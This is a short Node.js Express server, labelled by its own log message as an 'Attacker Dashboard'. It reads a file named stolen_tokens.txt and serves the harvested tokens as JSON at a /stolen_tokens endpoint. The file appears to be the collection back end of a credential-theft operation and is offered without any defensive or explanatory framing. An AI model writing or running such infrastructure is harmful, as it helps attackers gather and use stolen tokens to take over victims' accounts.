const express = require("express");
const fs = require("fs");

const app = express();

app.get("/stolen_tokens", (req, res) => {
    let tokens = fs.readFileSync("stolen_tokens.txt", "utf8").split("\n");
    res.json(tokens);
});

app.listen(3000, () => console.log("Attacker Dashboard Running"));
